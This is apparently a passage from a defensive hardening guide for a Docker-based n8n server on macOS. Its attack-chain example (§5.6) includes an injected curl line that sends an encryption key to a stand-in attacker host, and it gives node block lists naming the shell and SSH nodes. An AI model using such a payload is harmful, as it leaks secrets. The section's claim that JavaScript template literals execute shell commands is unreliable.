- **macOS updates**: New macOS versions can introduce new listening services. Re-baseline after upgrades.
- **Docker default behavior**: Docker binds to `0.0.0.0` by default. Always specify `127.0.0.1:` in port mappings (§4.3).

**Audit checks**: `CHK-LISTENERS-BASELINE` (WARN) → §3.6

---

## 4. Container Isolation (Prevent) — Containerized Path

### 4.1 Colima Setup

**Threat**: Docker Desktop licensing restrictions or GUI dependencies introduce unnecessary complexity and attack surface on a headless server
**Layer**: Prevent
**Deployment**: Containerized only
**Source**: [Colima](https://github.com/abiosoft/colima), [Lima](https://github.com/lima-vm/lima)

#### Why This Matters

Colima is a free, open-source, CLI-only Docker runtime for macOS. It runs a lightweight Linux VM via Lima that exposes the standard Docker socket — all `docker` and `docker compose` commands work without modification. Unlike Docker Desktop, Colima has no GUI layer, no licensing restrictions, and integrates cleanly with headless server management via SSH.

#### How to Harden

**Install Colima and Docker CLI:**

```bash
brew install colima docker docker-compose
```

**Start Colima with resource limits:**

```bash
# Start with explicit resource limits (adjust for your hardware)
colima start --cpu 4 --memory 8 --disk 60
```

**Configure persistent resource limits** in `~/.colima/default/colima.yaml`:

```yaml
cpu: 4
memory: 8
disk: 60
```

**Verify Docker CLI works:**

```bash
docker ps
docker compose version
```

> **NOTE**: Docker Desktop is an alternative (free for personal use and businesses with <250 employees / <$10M revenue). If using Docker Desktop, the same `docker-compose.yml` and hardening steps apply — only the VM layer differs.

#### Verification

```bash
# Colima is running
colima status
# Expected: "colima is running"

# Docker socket is accessible
docker info --format '{{.ServerVersion}}'
```

#### Edge Cases and Warnings

- **Apple Silicon vs Intel**: Colima autodetects and supports both. No special configuration needed.
- **Colima stops on Mac sleep**: If the Mac Mini sleeps, Colima stops and containers halt. Configure the Mac to not sleep (`sudo pmset -a sleep 0`) or use `caffeinate` during critical workflow windows.
- **Docker Desktop conflict**: If Docker Desktop is installed, Colima and Docker Desktop may conflict over the Docker socket. Uninstall Docker Desktop or switch the socket path.
- **`colima delete` destroys everything**: The VM, volumes, and configuration are deleted. Back up your `colima.yaml` and Docker volumes before running `colima delete`.

### 4.2 Docker Security Principles

**Threat**: Container misconfiguration allows privilege escalation, host filesystem access, credential theft via `docker inspect`, or container escape via Docker socket
**Layer**: Prevent
**Deployment**: Containerized only
**Source**: [CIS Docker Benchmark v1.6](https://www.cisecurity.org/benchmark/docker), [NIST SP 800-190](https://csrc.nist.gov/publications/detail/sp/800-190/final)

#### Why This Matters

Containerization reduces blast radius — if n8n is compromised, the attacker is confined to the container and cannot directly access the Mac Mini's filesystem, Keychain, SSH keys, or other services. However, Docker's defaults are permissive: containers run as root, have broad Linux capabilities, and bind ports to all interfaces. Without explicit hardening, a compromised container can escape to the host.

#### How to Harden

Every containerized n8n deployment MUST implement these seven security controls:

| Control | Directive | Risk if Missing |
|---------|-----------|----------------|
| Non-root user | `user: "1000:1000"` | Container root = VM root → privilege escalation |
| Read-only filesystem | `read_only: true` | Attacker writes persistent backdoor in container |
| Drop all capabilities | `cap_drop: [ALL]` | Container can modify network, load modules, etc. |
| No-new-privileges | `security_opt: [no-new-privileges:true]` | Setuid binaries escalate to root |
| Localhost port binding | `"127.0.0.1:5678:5678"` | n8n exposed to entire LAN/internet |
| No Docker socket mount | Never mount `/var/run/docker.sock` | Full host escape via Docker API |
| Docker secrets | `secrets:` not `environment:` | Credentials visible in `docker inspect` |

See §4.3 for the complete reference `docker-compose.yml` implementing all seven controls.

**Credential exposure vectors** `[EDUCATIONAL]`:

| Vector | What Leaks | Defense |
|--------|-----------|---------|
| `docker inspect <container>` | All environment variables in plaintext | Use Docker secrets, not env vars |
| `ps aux` (inside VM) | Command-line arguments | Never pass secrets as CLI args |
| `docker logs` | Secrets in error messages/debug output | Set log level to `warn` or `info` |
| `docker-compose.yml` | Plaintext credentials if using `environment:` | Use `secrets:` with `file:` source |
| Docker build cache | Secrets in `RUN`, `ENV`, `COPY` layers | Use `--mount=type=secret` in builds |

### 4.3 Reference docker-compose.yml

**Threat**: Misconfigured compose file exposes n8n to network, leaks credentials, or allows container escape
**Layer**: Prevent
**Deployment**: Containerized only
**Source**: [Docker Compose Security](https://docs.docker.com/compose/security/), [CIS Docker Benchmark §5](https://www.cisecurity.org/benchmark/docker)

#### Why This Matters

The `docker-compose.yml` IS the security configuration for containerized deployments. A single misconfiguration — binding to `0.0.0.0` instead of `127.0.0.1`, or using `environment:` instead of `secrets:` — undoes all container isolation. The reference file below implements all seven security controls from §4.2 and passes all container audit checks.

#### How to Harden

**Create the secrets directory:**

```bash
mkdir -p scripts/templates/secrets
chmod 700 scripts/templates/secrets

# Generate the encryption key
openssl rand -hex 32 > scripts/templates/secrets/n8n_encryption_key.txt
chmod 600 scripts/templates/secrets/n8n_encryption_key.txt

# Add secrets/ to .gitignore
echo "scripts/templates/secrets/" >> .gitignore
```

**Create the entrypoint wrapper** (`scripts/templates/n8n-entrypoint.sh`):

n8n's `_FILE` suffix for `N8N_ENCRYPTION_KEY` has known bugs in queue mode. Use an entrypoint wrapper to load secrets reliably:

```bash
#!/bin/sh
# Read Docker secrets that don't support _FILE suffix reliably
# See: https://github.com/n8n-io/n8n/issues/14596
if [ -f /run/secrets/n8n_encryption_key ]; then
  export N8N_ENCRYPTION_KEY="$(cat /run/secrets/n8n_encryption_key)"
fi
exec n8n start
```

**Reference `docker-compose.yml`** (see `scripts/templates/docker-compose.yml`):

```yaml
# OpenClaw Mac — Hardened n8n Docker Compose
# See docs/HARDENING.md §4.3 for security annotations
version: '3.9'

secrets:
  n8n_encryption_key:
    file: ./secrets/n8n_encryption_key.txt  # chmod 600 (FR-058, R-012)

services:
  n8n:
    # Pin image by digest for supply chain integrity (FR-040)
    # Update digest after verifying new version: docker pull n8nio/n8n:latest
    # Then: docker inspect n8nio/n8n:latest | jq -r '.[0].RepoDigests'
    image: n8nio/n8n:latest

    # Non-root user (FR-041) — UID 1000 matches Colima default
    user: "1000:1000"

    # Localhost-only port binding (FR-058)
    # DANGEROUS if changed to "5678:5678" — exposes to entire network
    ports:
      - "127.0.0.1:5678:5678"

    # Read-only root filesystem (FR-041)
    read_only: true
    tmpfs:
      - /tmp
      - /var/tmp

    # Persistent data only — no host directory mounts (FR-058)
    volumes:
      - n8n_data:/home/node/.n8n
      - ./n8n-entrypoint.sh:/entrypoint.sh:ro

    # Docker secrets — NOT environment variables (FR-058, FR-090)
    secrets:
      - n8n_encryption_key

    # Non-sensitive environment variables only (FR-058)
    environment:
      - N8N_HOST=localhost
      - N8N_PORT=5678
      - N8N_LOG_LEVEL=info
      - N8N_DIAGNOSTICS_ENABLED=false
      - N8N_PUBLIC_API_DISABLED=true
      # Sensitive values loaded by entrypoint script from /run/secrets/

    # Security hardening (FR-041)
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true

    # Core dump prevention (FR-068)
    ulimits:
      core:
        soft: 0
        hard: 0

    # Resource limits — adjust for your hardware (FR-058)
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G

    # Restart on crash, not after intentional stop (FR-058)
    restart: unless-stopped

    # Entrypoint wrapper for Docker secrets (R-001)
    entrypoint: ["/bin/sh", "/entrypoint.sh"]

    # DNS — use encrypted DNS resolver (FR-029)
    dns:
      - 9.9.9.9
      - 149.112.112.112

    # Docker log rotation — limit credential exposure window (FR-090)
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"

volumes:
  n8n_data:  # Persists workflows, credentials, execution logs
```

**Deploy:**

```bash
cd scripts/templates
docker compose up -d

# Verify n8n is running
docker compose ps
curl -s http://localhost:5678/healthz
```

#### Verification

```bash
# Verify non-root user
docker compose exec n8n id
# Expected: uid=1000 gid=1000

# Verify read-only filesystem
docker compose exec n8n touch /test 2>&1
# Expected: "Read-only file system"

# Verify no Docker socket mount
docker inspect $(docker compose ps -q n8n) --format '{{.Mounts}}' | grep -c docker.sock
# Expected: 0

# Verify localhost-only port binding
docker port $(docker compose ps -q n8n)
# Expected: 5678/tcp -> 127.0.0.1:5678

# Verify capabilities are dropped
docker inspect $(docker compose ps -q n8n) --format '{{.HostConfig.CapDrop}}'
# Expected: [ALL]

# Verify no secrets in environment (docker inspect should NOT show N8N_ENCRYPTION_KEY)
docker inspect $(docker compose ps -q n8n) --format '{{.Config.Env}}' | grep -i encryption
# Expected: no output (secret is loaded at runtime by entrypoint, not in container config)
```

#### Edge Cases and Warnings

- **Docker default port binding is `0.0.0.0`**: If you write `"5678:5678"` without the `127.0.0.1:` prefix, n8n is exposed to the entire network. Always include `127.0.0.1:`.
- **Read-only filesystem troubleshooting**: If n8n fails to start with "Read-only file system", check the error log for the path it needs to write. Add a `tmpfs` mount for that path — do NOT remove `read_only: true`.
- **Volume ownership**: If the named volume is owned by a different UID, fix with: `docker compose exec n8n chown -R 1000:1000 /home/node/.n8n`
- **Image digest pinning**: For production, replace `:latest` with a digest: `n8nio/n8n@sha256:...`. Get the digest: `docker inspect n8nio/n8n:latest | jq -r '.[0].RepoDigests'`

**Audit checks**: `CHK-CONTAINER-ROOT` (FAIL), `CHK-CONTAINER-READONLY` (WARN), `CHK-CONTAINER-CAPS` (WARN), `CHK-CONTAINER-PRIVILEGED` (FAIL), `CHK-DOCKER-SOCKET` (FAIL), `CHK-SECRETS-ENV` (WARN), `CHK-COLIMA-MOUNTS` (WARN) → §4.3

### 4.4 Advanced Container Hardening

**Threat**: Container escape via privilege escalation, excessive capabilities, or seccomp bypass; supply chain attack via tampered Docker images
**Layer**: Prevent
**Deployment**: Containerized only
**Source**: [Docker Seccomp](https://docs.docker.com/engine/security/seccomp/), [Docker Content Trust](https://docs.docker.com/engine/security/trust/), [MITRE ATT&CK T1195 — Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/)

#### Why This Matters

The reference `docker-compose.yml` (§4.3) provides strong defaults. This section covers advanced hardening: custom seccomp profiles, Docker Content Trust for image verification, image vulnerability scanning, and layer inspection to detect secrets leaked during builds.

#### How to Harden

**Docker Content Trust (image signature verification):**

```bash
# Enable Docker Content Trust globally
export DOCKER_CONTENT_TRUST=1

# Pull with signature verification
docker pull n8nio/n8n:latest
# If the image is not signed, this will fail — fall back to digest pinning

# Add to shell profile for persistence
echo 'export DOCKER_CONTENT_TRUST=1' >> ~/.bashrc
```

**Image vulnerability scanning** (free tools):

```bash
# Trivy (recommended — free, comprehensive)
brew install trivy
trivy image n8nio/n8n:latest

# Docker Scout (built into Docker CLI)
docker scout cves n8nio/n8n:latest

# Grype (alternative)
brew install grype
grype n8nio/n8n:latest
```

Scan before first deployment and after every image update. Rescan monthly for newly discovered CVEs.

**Layer history inspection** (detect secrets in build layers):

```bash
# Inspect all layers — verify no secrets in RUN, ENV, or COPY instructions
docker history --no-trunc n8nio/n8n:latest
```

**Custom seccomp profile** (if the default profile causes issues):

The default Docker seccomp profile allows ~310 of ~400 system calls. If n8n or a community node requires a blocked syscall:

1. Export the default profile: `docker inspect --format '{{.HostConfig.SecurityOpt}}' <container>`
2. Create a custom profile that adds only the required syscall
3. Apply: `security_opt: ["seccomp=custom-seccomp.json"]`

> **CAUTION**: Only relax seccomp if you've identified the specific blocked syscall. Never disable seccomp entirely.

**Custom Dockerfile security** (if building a custom n8n image):

```dockerfile
# Pin base image by digest
FROM n8nio/n8n@sha256:abc123... AS base

# Use multi-stage build — build dependencies don't ship in final image
FROM base AS builder
# Install build deps...

FROM base AS final
COPY --from=builder /app /app

# Never put secrets in ENV, RUN, or COPY — use --mount=type=secret
RUN --mount=type=secret,id=api_key cat /run/secrets/api_key > /dev/null
```

#### Verification

```bash
# Verify Docker Content Trust is enabled
echo $DOCKER_CONTENT_TRUST
# Expected: 1

# Check image scan results (Trivy)
trivy image --severity HIGH,CRITICAL n8nio/n8n:latest

# Verify no secrets in image layers
docker history --no-trunc n8nio/n8n:latest | grep -iE 'key|secret|password|token'
# Expected: no matches
```

#### Edge Cases and Warnings

- **Not all images are signed**: Docker Content Trust requires the publisher to sign images. If `n8nio/n8n` is not signed, fall back to digest pinning.
- **Vulnerability scan noise**: Base images often have known CVEs in system libraries that don't affect n8n. Focus on HIGH and CRITICAL severity.
- **Build cache secrets**: If you used `docker build` with secrets in `RUN` or `ENV` instructions, those secrets persist in layer history even in intermediate layers. Use `docker builder prune` to clean up.

### 4.5 Container Networking

**Threat**: Container reaches internal LAN services via SSRF; Docker port binding exposes services to the network; container DNS bypasses encrypted DNS configuration
**Layer**: Prevent
**Deployment**: Containerized only
**Source**: [CIS Docker Benchmark §5.7](https://www.cisecurity.org/benchmark/docker), [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

#### Why This Matters

Docker's bridge network gives containers access to the host gateway, other containers, and potentially the LAN. If n8n is compromised, the attacker can use the HTTP Request node to probe internal services (SSRF), access the Docker API via the gateway IP, or reach cloud metadata endpoints. Container DNS may also bypass the host's encrypted DNS configuration.

#### How to Harden

**Verify container network isolation:**

```bash
# Check what networks the container is on
docker inspect $(docker compose ps -q n8n) --format '{{json .NetworkSettings.Networks}}' | jq

# Verify the container cannot reach the host's other services
docker compose exec n8n wget -q -O- http://host.docker.internal:22 2>&1 || echo "Blocked (good)"
```

**SSRF defense via iptables** (inside Colima VM — cross-ref §3.3):

The iptables provisioning script in §3.3 blocks container access to RFC 1918 ranges. This prevents n8n from reaching:

- Other Docker containers on the bridge network (if not needed)
- macOS services bound to the host gateway IP
- LAN devices and their management interfaces
- Cloud metadata endpoints (169.254.169.254)

**Container DNS** (cross-ref §3.2):

The reference `docker-compose.yml` configures Quad9 DNS explicitly:

```yaml
dns:
  - 9.9.9.9
  - 149.112.112.112
```

Without this, containers use the Colima VM's resolver, which may not use encrypted DNS.

**Network mode restriction:**

Never use `network_mode: host` — it bypasses all container network isolation and gives the container direct access to all host network interfaces.

#### Verification

```bash
# Verify DNS configuration inside container
docker compose exec n8n cat /etc/resolv.conf
# Expected: nameserver 9.9.9.9

# Verify port binding is localhost-only
docker port $(docker compose ps -q n8n)
# Expected: 5678/tcp -> 127.0.0.1:5678

# Verify container is NOT in host network mode
docker inspect $(docker compose ps -q n8n) --format '{{.HostConfig.NetworkMode}}'
# Expected: "default" (bridge network), NOT "host"
```

#### Edge Cases and Warnings

- **Docker bridge gateway**: By default, containers can reach the host via the bridge gateway IP (usually `172.17.0.1`). The iptables rules in §3.3 block this.
- **Cloud metadata**: If the Mac Mini has cloud-related tools installed, the metadata endpoint `169.254.169.254` may be reachable from containers. Block via iptables.
- **Container-to-container**: If running multiple containers, they can communicate over the bridge network. Use Docker's `--internal` flag for networks that don't need external access.

---

## 5. n8n Platform Security (Prevent)

### 5.1 Binding and Authentication

**Threat**: Unauthenticated n8n instance accessible from the network allows anyone to create workflows, extract credentials, and achieve remote code execution
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [n8n Security Documentation](https://docs.n8n.io/hosting/configuration/environment-variables/security/)

#### Why This Matters

n8n provides a web UI and REST API that can create, modify, and execute workflows — including Code and Execute Command nodes. An unauthenticated n8n instance on the network is equivalent to giving every LAN device a shell on your server.

#### How to Harden

**Bind n8n to localhost only:**

```bash
# Environment variable (set in docker-compose.yml or shell profile)
N8N_HOST=localhost
N8N_PORT=5678
```

- **Containerized**: The reference `docker-compose.yml` (§4.3) maps `127.0.0.1:5678:5678` — n8n is already localhost-only.
- **Bare-metal**: Set `N8N_HOST=localhost` in the launchd plist or shell profile.

**Enable authentication:**

n8n v2.0+ uses built-in user management (replaces basic auth). On first launch, n8n prompts for owner account creation.

```bash
# Ensure user management is active (default in v2.0+)
# Set a strong, unique password for the owner account during initial setup
```

**Enable TOTP 2FA for the owner account:**

```bash
# n8n supports native TOTP 2FA (since v1.102.0)
N8N_MFA_ENABLED=true  # Default is true in v2.0+
```

After logging in as the owner, enable 2FA in Settings > Personal > Security. Use an authenticator app (Google Authenticator, Authy, or 1Password).

> **WARNING**: Enable n8n authentication BEFORE binding n8n to a network interface. If remote access is needed before auth is configured, an attacker can take over the instance.

#### Verification

```bash
# Verify n8n is bound to localhost
# Containerized:
docker port $(docker compose ps -q n8n) 2>/dev/null
# Expected: 5678/tcp -> 127.0.0.1:5678

# Bare-metal:
sudo lsof -iTCP:5678 -sTCP:LISTEN -P -n 2>/dev/null
# Expected: bound to 127.0.0.1, not 0.0.0.0

# Verify authentication is required
curl -s http://localhost:5678/rest/login 2>/dev/null | head -1
# Expected: 401 or redirect to login page
```

#### Edge Cases and Warnings

- **WebAuthn/FIDO2**: Not supported by n8n. Use TOTP only.
- **Multi-user caveats**: n8n user management does NOT provide workflow-level isolation. All users see all workflows. Use role separation (owner vs member) but don't rely on it for credential isolation.
- **Credential reuse**: Use a unique password for n8n — not your macOS login, SSH key passphrase, or any other service password.

**Audit checks**: `CHK-N8N-BIND` (FAIL), `CHK-N8N-AUTH` (FAIL) → §5.1

### 5.2 User Management

**Threat**: Single admin account shared among operators creates accountability gaps; compromised account has full system access
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A07 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

#### Why This Matters

The n8n owner account has full access to workflow creation, credential management, user management, and the REST API. If shared among multiple operators, there is no audit trail for who made which changes.

#### How to Harden

- **Owner account**: Limit to one person — the primary operator responsible for security. Use a strong, unique password with TOTP 2FA enabled.
- **Member accounts**: Create member accounts for additional users with minimal permissions. Members can view and execute workflows but have limited administrative access.
- **API key separation**: If the REST API is enabled, each user should have their own API key — never share API keys.

#### Edge Cases and Warnings

- **No workflow-level isolation**: All users can see all workflows and credentials by default. n8n does not support per-workflow access control. If strict isolation is needed, run separate n8n instances.

### 5.3 Security Environment Variables

**Threat**: Default n8n configuration enables telemetry, allows Code nodes to read environment variables, and leaves the REST API accessible — each expanding attack surface
**Layer**: Prevent
**Deployment**: Both
**Source**: [n8n Environment Variables](https://docs.n8n.io/hosting/configuration/environment-variables/)

#### Why This Matters

n8n's security-relevant settings are scattered across multiple documentation pages. Missing a single critical variable — like leaving `N8N_BLOCK_ENV_ACCESS_IN_NODE` unset on v1.x — can expose the master encryption key to any Code node. This section consolidates all security variables in one reference.

#### How to Harden

Set these environment variables in your deployment configuration (`docker-compose.yml` for containerized, launchd plist for bare-metal):

**Critical security variables:**

| Variable | Recommended Value | Risk if Default | Notes |
|----------|-------------------|-----------------|-------|
| `N8N_ENCRYPTION_KEY` | Random 64-char hex | Credentials stored unencrypted | Generate: `openssl rand -hex 32` |
| `N8N_BLOCK_ENV_ACCESS_IN_NODE` | `true` | Code nodes can read `N8N_ENCRYPTION_KEY` | Default `true` in v2.0, `false` in v1.x — verify |
| `N8N_RESTRICT_FILE_ACCESS_TO` | `/home/node/.n8n` | Code nodes access entire filesystem | Containerized: container limits this; bare-metal: critical |
| `N8N_PUBLIC_API_DISABLED` | `true` | REST API allows workflow creation/credential access | Set to `true` unless API is needed |
| `N8N_MFA_ENABLED` | `true` | No 2FA protection on accounts | Default `true` in v2.0+ |
| `N8N_USER_MANAGEMENT_JWT_SECRET` | Random 64-char hex | Weak JWT signing | Generate: `openssl rand -hex 32` |

**Telemetry and information leakage:**

| Variable | Recommended Value | What It Leaks |
|----------|-------------------|---------------|
| `N8N_DIAGNOSTICS_ENABLED` | `false` | Deployment details, workflow counts, node usage |
| `N8N_TEMPLATES_ENABLED` | `false` | Outbound requests to n8n servers |
| `N8N_VERSION_NOTIFICATIONS_ENABLED` | `false` | Version check requests to n8n servers |
| `N8N_HIRING_BANNER_ENABLED` | `false` | Minor UI noise reduction |
| `N8N_PERSONALIZATION_ENABLED` | `false` | Usage data collection |

**Logging and execution data:**

| Variable | Recommended Value | Security Impact |
|----------|-------------------|----------------|
| `N8N_LOG_LEVEL` | `info` or `warn` | `debug` may include secrets in logs |
| `EXECUTIONS_DATA_SAVE_ON_ERROR` | `all` | Needed for forensic review |
| `EXECUTIONS_DATA_SAVE_ON_SUCCESS` | `none` or `all` | `all` retains PII in execution logs |

**Node type restrictions:**

```bash
# Block dangerous node types (v2.0 blocks ExecuteCommand by default)
NODES_EXCLUDE='["n8n-nodes-base.executeCommand","n8n-nodes-base.ssh","n8n-nodes-base.localFileTrigger"]'
```

> **NOTE**: `EXECUTIONS_PROCESS` was removed in n8n v2.0. Setting it causes a startup failure. Do not include it.

See Appendix A for the complete reference table.

#### Verification

```bash
# Containerized: check environment inside container
docker compose exec n8n env | grep -E 'N8N_BLOCK|N8N_DIAGNOSTICS|N8N_PUBLIC_API' 2>/dev/null

# Bare-metal: check n8n process environment
ps -p $(pgrep -f "n8n start") -o pid=,command= 2>/dev/null
```

**Audit checks**: `CHK-N8N-ENV-BLOCK` (WARN), `CHK-N8N-ENV-DIAGNOSTICS` (WARN), `CHK-N8N-ENV-API` (WARN) → §5.3

### 5.4 REST API Security

**Threat**: Attacker with API access creates malicious workflows for persistent code execution, extracts stored credentials, or modifies existing workflows
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [MITRE ATT&CK T1106 — Native API](https://attack.mitre.org/techniques/T1106/)

#### Why This Matters

The n8n REST API can create, modify, delete, and execute workflows, plus read and write stored credentials. An attacker who reaches the API can achieve persistent arbitrary code execution by creating a workflow with a Code or Execute Command node — and this workflow survives reboots.

#### How to Harden

**Preferred: Disable the API entirely:**

```bash
N8N_PUBLIC_API_DISABLED=true
```

**If the API is needed:**

- Require API key authentication (configured in n8n Settings > API)
- Store API keys as credentials (Docker secrets or Keychain — never in plaintext config files)
- Rotate API keys on the same schedule as other credentials (§7.2)
- Monitor for unexpected workflow changes via n8n's execution log
- Consider rate limiting via reverse proxy (§5.8)

The API shares the same port and binding as the web UI. Localhost binding (§5.1) protects it from network access, but any process on the Mac Mini that can reach localhost:5678 can call the API.

#### Verification

```bash
# Verify API is disabled
curl -s http://localhost:5678/api/v1/workflows -H "Accept: application/json" 2>/dev/null
# Expected: 404 or 401 (not a list of workflows)
```

**Audit check**: `CHK-N8N-API` (WARN) → §5.4

### 5.5 Webhook Security

**Threat**: Unauthenticated webhook endpoints allow attackers to trigger workflows, inject malicious payloads, or abuse webhooks for denial of service
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/), [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

#### Why This Matters

Every n8n Webhook node creates an HTTP endpoint. If webhooks receive Apify completion callbacks from the internet, they are direct entry points for attackers. An unauthenticated webhook that triggers a workflow processing scraped data can be used to inject malicious payloads.

#### How to Harden

**Configure webhook authentication (all webhook nodes):**

n8n supports four authentication methods:

| Method | Security | Use Case |
|--------|----------|----------|
| **Header Auth** (recommended) | Strong — cryptographic random secret in header | General webhook ingress |
| **JWT Auth** | Strongest — signed token validation | Environments with JWT infrastructure |
| **Basic Auth** | Moderate — username/password | Simple integrations |
| **None** | **Dangerous** — open to anyone | Never use in production |

Set up Header Auth on each webhook node:

1. In the webhook node settings, set Authentication to "Header Auth"
2. Generate a secret: `openssl rand -hex 32`
3. Configure the header name (e.g., `X-Webhook-Secret`) and value
4. Ensure the calling service (Apify) includes this header in webhook requests

**Use production webhook URLs (not test URLs):**

n8n test webhook URLs use predictable paths based on workflow ID and node name. Production webhook URLs use random paths. Always activate workflows and use production URLs for external integrations.

**Apify webhook configuration:**

Apify does NOT support HMAC webhook signing. Instead:

1. Add a secret token to the webhook URL: `https://your-server/webhook/path?token=SECRET`
2. Combine with n8n webhook Header Auth
3. Optionally validate the `X-Apify-Webhook-Dispatch-Id` header against Apify's API
4. Consider IP allowlisting if Apify publishes source IP ranges

**Webhook payload validation:**

Every webhook-triggered workflow MUST validate the incoming payload structure before processing:

- Check expected fields exist
- Validate data types and length limits
- Reject payloads that don't match the expected schema
- Cross-reference §5.6 for injection defense when webhook data reaches code execution nodes

**Rate limiting:**

If webhooks are internet-facing, implement rate limiting via the reverse proxy (§5.8) to prevent abuse.

#### Verification

```bash
# Check webhook access logs (if reverse proxy is configured)
# Monitor for high-volume requests, unexpected source IPs, or unusual payloads
```

**Audit check**: `CHK-N8N-WEBHOOK` (WARN) → §5.5

### 5.6 Execution Model and Node Isolation

**Threat**: Scraped LinkedIn data containing shell metacharacters or prompt injection payloads reaches a Code or Execute Command node, achieving remote code execution inside n8n
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A03 Injection](https://owasp.org/Top10/A03_2021-Injection/), [OWASP LLM Top 10 — LLM01 Prompt Injection](https://owasp.org/www-project-top-10-for-large-language-model-applications/), [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

#### Why This Matters

n8n Code nodes execute JavaScript in the same Node.js process as n8n itself — there is NO sandbox. A Code node can access `process.env` (including `N8N_ENCRYPTION_KEY`), `require()` any module, make network requests, and read/write the filesystem. If scraped LinkedIn data reaches a Code node via string interpolation, it is remote code execution.

**Concrete attack chain:**

1. Attacker edits their LinkedIn job title to: `` `; curl attacker.com/exfil?key=$(cat /run/secrets/n8n_encryption_key)` ``
2. Apify scrapes the profile and returns the malicious job title
3. n8n workflow processes the data with a Code node: `` const result = `Processing ${item.jobTitle}` ``
4. The backtick-interpolated string executes the attacker's shell command

#### How to Harden

**Set critical environment variables:**

```bash
# Prevent Code nodes from reading environment variables (blocks N8N_ENCRYPTION_KEY leakage)
N8N_BLOCK_ENV_ACCESS_IN_NODE=true  # Default true in v2.0, verify for v1.x

# Restrict filesystem access from Code nodes
N8N_RESTRICT_FILE_ACCESS_TO=/home/node/.n8n  # Containerized
N8N_RESTRICT_FILE_ACCESS_TO=/path/to/n8n/data  # Bare-metal
```

**Block dangerous node types:**

```bash
# Disable Execute Command, SSH, and local file trigger nodes
NODES_EXCLUDE='["n8n-nodes-base.executeCommand","n8n-nodes-base.ssh","n8n-nodes-base.localFileTrigger"]'
```

n8n v2.0 blocks `executeCommand` and `localFileTrigger` by default. Verify:

```bash
docker compose exec n8n env | grep NODES_EXCLUDE 2>/dev/null
```

**Audit workflows processing scraped data:**

Review each workflow for nodes that can execute code:

| Node Type | Risk | Recommendation |
|-----------|------|----------------|
| **Code** | JavaScript execution | Never interpolate scraped data into code strings |
| **Execute Command** | Shell execution | Block via `NODES_EXCLUDE` |
| **SSH** | Remote shell | Block via `NODES_EXCLUDE` |
| **HTTP Request** | SSRF vector | Use allowlisted base URLs only (§7.5) |
| **AI Agent / LangChain** | Prompt injection | Structural separation of data and prompts |
| **Function** (legacy) | JavaScript execution | Migrate to Code node with same precautions |

**Safe patterns for scraped data:**

- Use Set/IF/Switch/Merge nodes for transformations (these don't execute code)
- In Code nodes, treat all scraped fields as data, never code: `JSON.stringify(item.jobTitle)` instead of template literals
- Validate data types and lengths before processing
- Never chain LLM output to code execution nodes

**Containerized advantage:** If injection succeeds, the attacker gets a container shell — not a host shell. The blast radius is limited to the container's filesystem and network access (§4).

**Bare-metal warning:** Without containerization, successful injection gives the attacker full access to the operator's home directory, SSH keys, macOS Keychain, and the ability to install persistent backdoors. Containerization is the single most important control for deployments processing scraped web data.

#### Verification

```bash
# Verify N8N_BLOCK_ENV_ACCESS_IN_NODE is set
docker compose exec n8n env 2>/dev/null | grep N8N_BLOCK_ENV_ACCESS_IN_NODE
# Expected: N8N_BLOCK_ENV_ACCESS_IN_NODE=true

# Review execution logs for injection indicators
# Look for: unexpected outbound connections, unusual commands, file access outside expected paths
```

**Audit checks**: `CHK-N8N-NODES` (WARN), `CHK-N8N-ENV-BLOCK` (WARN) → §5.6

### 5.7 Community Node Vetting

**Threat**: Malicious or compromised npm package executes arbitrary code within the n8n process, accessing all credentials, environment variables, and filesystem
**Layer**: Prevent
**Deployment**: Both
**Source**: [OWASP A08 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/), [MITRE ATT&CK T1195.001 — Compromise Software Dependencies](https://attack.mitre.org/techniques/T1195/001/)

#### Why This Matters

Community nodes are npm packages that execute arbitrary code within the n8n process. They have full access to n8n's environment, credentials, and filesystem. A malicious or compromised community node can silently exfiltrate all stored credentials.

#### How to Harden

**Vetting checklist** — complete before installing any community node:

1. **Source repository**: Check npm page for a public source repo (GitHub/GitLab). No source = do not install.
2. **Maintainer reputation**: Check publisher's npm profile for other packages and publication history. New account with one package = high risk.
3. **Download volume**: Check weekly downloads. Under 100/week = minimal community vetting.
4. **Version history**: Check for suspicious version churn (sudden update after long inactivity = possible account takeover).
5. **Dependency audit**: Run `npm audit` before installation. Check for known vulnerabilities in the dependency tree.
6. **Code review** (for high-risk nodes): Look for:
   - Obfuscated code or minified bundles without source maps
   - `eval()`, `Function()`, or dynamic `require()` calls
   - Outbound network requests to hardcoded URLs
   - Postinstall scripts that download or execute external code
   - Filesystem access outside expected paths

**Safe installation procedure:**

```bash
# Install with --ignore-scripts first (prevents postinstall code execution)
npm install --ignore-scripts n8n-nodes-community-example

# Review postinstall scripts
cat node_modules/n8n-nodes-community-example/package.json | jq '.scripts'

# If scripts are safe, re-install normally
npm install n8n-nodes-community-example
```

> **NOTE**: Even a legitimate community node can be compromised later via maintainer account takeover. Vetting reduces but does not eliminate supply chain risk.

#### Edge Cases and Warnings

- **Automatic updates**: Do not enable automatic npm updates for community nodes. Re-vet before each update.
- **Credential access**: Community nodes can access n8n's credential storage. Only install nodes on instances handling sensitive credentials if they've been code-reviewed.

### 5.8 Reverse Proxy

**Threat**: n8n exposed directly to the internet without TLS encryption, rate limiting, or access control
**Layer**: Prevent
**Deployment**: Both
